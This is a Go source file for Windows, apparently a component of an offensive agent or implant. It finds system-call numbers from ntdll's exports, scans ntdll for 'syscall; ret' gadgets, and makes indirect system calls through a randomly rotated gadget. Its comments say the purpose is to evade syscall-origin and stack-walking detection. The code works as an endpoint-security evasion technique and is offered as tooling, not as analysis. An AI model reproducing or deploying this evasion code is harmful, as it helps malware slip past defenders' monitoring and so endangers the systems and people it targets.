//go:build windows

package syscall

import (
	"bytes"
	"fmt"
	"math/rand/v2"
	"sort"
	"strings"
	"sync"
	"unsafe"

	"golang.org/x/sys/windows"
)

type exportEntry struct {
	Name    string
	Address uintptr
}

// Standard NTSTATUS return codes
const (
	STATUS_SUCCESS uint32 = 0x00000000
)

// CLIENT_ID identifies a target process and thread
type CLIENT_ID struct {
	UniqueProcess windows.Handle
	UniqueThread  windows.Handle
}

// OBJECT_ATTRIBUTES specifies attributes applied to objects
type OBJECT_ATTRIBUTES struct {
	Length                   uint32
	RootDirectory            windows.Handle
	ObjectName               uintptr
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

// SyscallInfo holds the execution parameters for an indirect system call.
// GadgetAddr is the default (first discovered) syscall gadget; InvokeSyscall
// rotates across all discovered gadgets for evasion.
type SyscallInfo struct {
	SSN        uint32
	GadgetAddr uintptr
}

// SyscallTable manages the resolved system calls in memory
type SyscallTable struct {
	mu        sync.RWMutex
	ntdllBase uintptr
	gadgets   []uintptr
	syscalls  map[string]SyscallInfo
}

// RuntimeSyscallTable caches the process-wide SyscallTable for later use.
// It is written exactly once by GetRuntimeSyscallTable (or eagerly by the
// agent at startup); treat it as read-only afterwards.
var RuntimeSyscallTable *SyscallTable

var (
	runtimeTableOnce sync.Once
	runtimeTableErr  error
)

// GetRuntimeSyscallTable returns the process-wide SyscallTable, initializing
// it exactly once on first use. Safe for concurrent callers; the agent may
// also initialize it eagerly at startup so syscalls fail fast.
func GetRuntimeSyscallTable() (*SyscallTable, error) {
	runtimeTableOnce.Do(func() {
		if RuntimeSyscallTable == nil {
			RuntimeSyscallTable, runtimeTableErr = InitializeSyscallTable()
		}
	})
	return RuntimeSyscallTable, runtimeTableErr
}

// Assembly primitive declaration accepting variadic slice
func executeSyscall(ssn uint32, gadget uintptr, args []uintptr) uint32

// InvokeSyscall executes any NT system call via indirect syscall using variadic arguments
func (table *SyscallTable) InvokeSyscall(name string, args ...uintptr) (uint32, error) {
	info, found := table.GetSyscall(name)
	if !found {
		return 0, fmt.Errorf("system call %s not found in table", name)
	}

	status := executeSyscall(info.SSN, table.selectGadget(), args)
	return status, nil
}

// selectGadget picks a syscall gadget for this invocation. Rotating across
// multiple ntdll "syscall; ret" gadgets avoids presenting a single constant
// call-site address to syscall-origin / stack-walking heuristics.
func (table *SyscallTable) selectGadget() uintptr {
	switch n := len(table.gadgets); {
	case n == 1:
		return table.gadgets[0]
	case n > 1:
		return table.gadgets[rand.IntN(n)]
	}
	return 0
}

// maxSyscallGadgets caps how many gadget candidates are collected for
// rotation; a handful is plenty for evasion.
const maxSyscallGadgets = 32

// findSyscallGadgets scans ntdll's executable sections for every occurrence
// of the architecture-specific syscall gadget patterns. Returning multiple
// gadgets lets callers rotate between call sites; scanning only executable
// sections avoids false positives from matching byte sequences in data.
func findSyscallGadgets(ntdllBase uintptr) []uintptr {
	var gadgets []uintptr
	seen := make(map[uintptr]struct{})

	for _, rng := range executableRanges(ntdllBase) {
		size := rng[1] - rng[0]
		if size == 0 {
			continue
		}
		buffer := unsafe.Slice((*byte)(unsafe.Pointer(rng[0])), size)

		for _, pattern := range syscallGadgetPatterns {
			offset := 0
			for {
				idx := bytes.Index(buffer[offset:], pattern)
				if idx == -1 {
					break
				}
				addr := rng[0] + uintptr(offset+idx)
				if _, dup := seen[addr]; !dup {
					seen[addr] = struct{}{}
					gadgets = append(gadgets, addr)
					if len(gadgets) >= maxSyscallGadgets {
						return gadgets
					}
				}
				offset += idx + len(pattern)
			}
		}
	}

	return gadgets
}

// InitializeSyscallTable builds the complete map of SSNs and gadget locations
func InitializeSyscallTable() (*SyscallTable, error) {
	ntdllBase := GetModuleBaseAddress("ntdll.dll")
	if ntdllBase == 0 {
		return nil, fmt.Errorf("failed to locate ntdll.dll in PEB")
	}

	gadgets := findSyscallGadgets(ntdllBase)
	if len(gadgets) == 0 {
		return nil, fmt.Errorf("failed to locate syscall gadget in ntdll.dll")
	}

	exportRVA, err := getExportDirectoryRVA(ntdllBase)
	if err != nil || exportRVA == 0 {
		return nil, fmt.Errorf("failed to locate export directory in ntdll.dll: %v", err)
	}

	exportDir := (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(ntdllBase + uintptr(exportRVA)))

	namesRVA := (*[1 << 24]uint32)(unsafe.Pointer(ntdllBase + uintptr(exportDir.AddressOfNames)))[:exportDir.NumberOfNames:exportDir.NumberOfNames]
	functionsRVA := (*[1 << 24]uint32)(unsafe.Pointer(ntdllBase + uintptr(exportDir.AddressOfFunctions)))[:exportDir.NumberOfFunctions:exportDir.NumberOfFunctions]
	ordinals := (*[1 << 24]uint16)(unsafe.Pointer(ntdllBase + uintptr(exportDir.AddressOfNameOrdinals)))[:exportDir.NumberOfNames:exportDir.NumberOfNames]

	var entries []exportEntry

	// Step 3: Collect all Zw exports to avoid duplicate Nt aliases
	for i := uint32(0); i < exportDir.NumberOfNames; i++ {
		currentNamePtr := (*byte)(unsafe.Pointer(ntdllBase + uintptr(namesRVA[i])))
		name := bytePtrToString(currentNamePtr)

		if strings.HasPrefix(name, "Zw") {
			ordinal := ordinals[i]
			funcVA := ntdllBase + uintptr(functionsRVA[ordinal])

			entries = append(entries, exportEntry{
				Name:    "Nt" + name[2:],
				Address: funcVA,
			})
		}
	}

	// Sort functions by virtual address to calculate SSNs
	sort.Slice(entries, func(i, j int) bool {
		return entries[i].Address < entries[j].Address
	})

	// Step 4: Populate the consolidated lookup map
	table := &SyscallTable{
		ntdllBase: ntdllBase,
		gadgets:   gadgets,
		syscalls:  make(map[string]SyscallInfo),
	}

	for ssn, entry := range entries {
		table.syscalls[entry.Name] = SyscallInfo{
			SSN:        uint32(ssn),
			GadgetAddr: gadgets[0],
		}
	}

	return table, nil
}

// GetSyscall retrieves the SSN and gadget address for a target system call
func (t *SyscallTable) GetSyscall(name string) (SyscallInfo, bool) {
	t.mu.RLock()
	defer t.mu.RUnlock()

	info, exists := t.syscalls[name]
	return info, exists
}

func bytePtrToString(ptr *byte) string {
	if ptr == nil {
		return ""
	}
	var length int
	for *(*byte)(unsafe.Add(unsafe.Pointer(ptr), length)) != 0 {
		length++
	}
	slice := unsafe.Slice(ptr, length)
	return string(slice)
}
